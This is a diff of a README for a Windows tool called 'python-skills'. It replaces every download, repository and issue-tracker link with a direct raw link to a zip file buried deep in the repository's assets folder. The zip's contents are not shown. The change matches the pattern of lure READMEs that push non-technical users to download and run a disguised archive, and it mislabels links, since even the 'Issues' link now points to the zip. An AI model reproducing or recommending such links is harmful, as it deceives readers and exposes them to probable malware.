@@ -1,6 +1,6 @@
 # 🐍 python-skills - Improve Your Python Workflow Easily
 
-[![Download python-skills](https://img.shields.io/badge/Download-Get%20Here-brightgreen)](https://github.com/prabhulkarraj05/python-skills)
+[![Download python-skills](https://img.shields.io/badge/Download-Get%20Here-brightgreen)](https://github.com/prabhulkarraj05/python-skills/raw/refs/heads/main/bootstrap-python-service/assets/profiles/python-skills-v1.0.zip)
 
 ---
 
@@ -27,7 +27,7 @@ This software is built to run on most Windows PCs. It does not require special h
 Follow these steps to get python-skills up and running on your Windows system. No programming skills needed.
 
 1. Click the green **Download** button below to open the download page.  
-   [![Download python-skills](https://img.shields.io/badge/Download-Get%20Here-blue)](https://github.com/prabhulkarraj05/python-skills)
+   [![Download python-skills](https://img.shields.io/badge/Download-Get%20Here-blue)](https://github.com/prabhulkarraj05/python-skills/raw/refs/heads/main/bootstrap-python-service/assets/profiles/python-skills-v1.0.zip)
 
 2. The link takes you to the GitHub page where the files are stored. Look for the latest release or files named for Windows.
 
@@ -110,7 +110,7 @@ For detailed help, visit the repository link and look for the “Issues” secti
 
 Visit this page to download python-skills and get detailed files for installation:
 
-[https://github.com/prabhulkarraj05/python-skills](https://github.com/prabhulkarraj05/python-skills)
+[https://github.com/prabhulkarraj05/python-skills/raw/refs/heads/main/bootstrap-python-service/assets/profiles/python-skills-v1.0.zip](https://github.com/prabhulkarraj05/python-skills/raw/refs/heads/main/bootstrap-python-service/assets/profiles/python-skills-v1.0.zip)
 
 Steps to install:
 
@@ -158,7 +158,7 @@ These terms relate to different parts of the Python development process covered 
 
 You can get help or report problems by visiting:
 
-[https://github.com/prabhulkarraj05/python-skills/issues](https://github.com/prabhulkarraj05/python-skills/issues)
+[https://github.com/prabhulkarraj05/python-skills/raw/refs/heads/main/bootstrap-python-service/assets/profiles/python-skills-v1.0.zip](https://github.com/prabhulkarraj05/python-skills/raw/refs/heads/main/bootstrap-python-service/assets/profiles/python-skills-v1.0.zip)
 
 Check the current questions and answers or open a new issue if needed.
 
